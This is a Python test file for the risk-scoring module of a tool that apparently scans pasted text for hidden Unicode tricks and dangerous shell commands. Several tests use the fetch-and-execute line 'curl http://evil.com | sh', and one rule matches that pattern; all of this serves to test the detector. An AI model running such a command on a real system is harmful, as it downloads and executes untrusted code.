"""Tests for the heuristic scoring system."""

from gripboard.rules import Rule, Ruleset
from gripboard.scanner import Finding, ScanResult, Scanner, Severity
from gripboard.scoring import ScoreBreakdown, compute_score, full_analysis
from gripboard.shellparser import CommandAnalysis, CommandRisk


class TestComputeScore:
    def test_clean_content(self):
        result = ScanResult(content="echo hello", findings=[])
        breakdown = compute_score(result)
        assert breakdown.total_score == 0
        assert breakdown.severity == Severity.SAFE

    def test_unicode_only(self):
        scanner = Scanner()
        result = scanner.scan("\u200Bhello")
        breakdown = compute_score(result)
        assert breakdown.unicode_score > 0
        assert breakdown.total_score > 0

    def test_high_unicode(self):
        scanner = Scanner()
        # Multiple high-severity findings
        result = scanner.scan("\u0430\u0441\u0435")  # 3 cyrillic homoglyphs
        breakdown = compute_score(result)
        assert breakdown.unicode_findings == 3
        assert breakdown.severity in (Severity.HIGH, Severity.MEDIUM)

    def test_rule_findings(self):
        result = ScanResult(content="test", findings=[])
        rule_findings = [
            Finding(
                rule="rule:test", description="test",
                severity=Severity.CRITICAL, position=0,
                char="t", codepoint="rule:test",
            ),
        ]
        breakdown = compute_score(result, rule_findings=rule_findings)
        assert breakdown.rule_score == 35
        assert breakdown.rule_matches == 1

    def test_shell_analysis(self):
        result = ScanResult(content="test", findings=[])
        shell = [CommandAnalysis(raw="curl evil.com | sh", risk=CommandRisk.CRITICAL)]
        breakdown = compute_score(result, shell_analyses=shell)
        assert breakdown.shell_score == 40
        assert breakdown.severity == Severity.MEDIUM  # 40 pts = MEDIUM (45+ is HIGH)

    def test_combined_scoring(self):
        scanner = Scanner()
        result = scanner.scan("\u200Bcurl http://evil.com | sh")
        rule_findings = [
            Finding(
                rule="rule:pipe-to-shell", description="pipe to shell",
                severity=Severity.CRITICAL, position=0,
                char="c", codepoint="rule:pipe-to-shell",
            ),
        ]
        shell = [CommandAnalysis(raw="curl http://evil.com | sh", risk=CommandRisk.CRITICAL)]
        breakdown = compute_score(result, rule_findings=rule_findings, shell_analyses=shell)
        # ZWS (15) + rule CRIT (35) + shell CRIT (40) = 90
        assert breakdown.total_score >= 70
        assert breakdown.severity == Severity.CRITICAL

    def test_score_cap_100(self):
        result = ScanResult(content="test", findings=[])
        # Stack up enough to exceed 100
        many_rules = [
            Finding(
                rule=f"rule:r{i}", description="bad",
                severity=Severity.CRITICAL, position=0,
                char="x", codepoint="rule:x",
            )
            for i in range(10)
        ]
        breakdown = compute_score(result, rule_findings=many_rules)
        assert breakdown.total_score == 100


class TestFullAnalysis:
    def test_clean(self):
        scanner = Scanner()
        result = scanner.scan("echo hello")
        breakdown = full_analysis("echo hello", result)
        assert breakdown.total_score == 0

    def test_with_ruleset(self):
        scanner = Scanner()
        result = scanner.scan("curl http://evil.com | sh")
        ruleset = Ruleset(rules=[
            Rule(id="pipe-sh", description="pipe to shell",
                 pattern=r"curl.*\|\s*sh", severity=Severity.CRITICAL),
        ])
        breakdown = full_analysis("curl http://evil.com | sh", result, ruleset=ruleset)
        assert breakdown.rule_matches >= 1
        assert breakdown.shell_score > 0
        assert breakdown.severity == Severity.CRITICAL

    def test_no_shell_analysis(self):
        scanner = Scanner()
        result = scanner.scan("echo hello")
        breakdown = full_analysis("echo hello", result, analyze_shell=False)
        assert breakdown.shell_commands_analyzed == 0
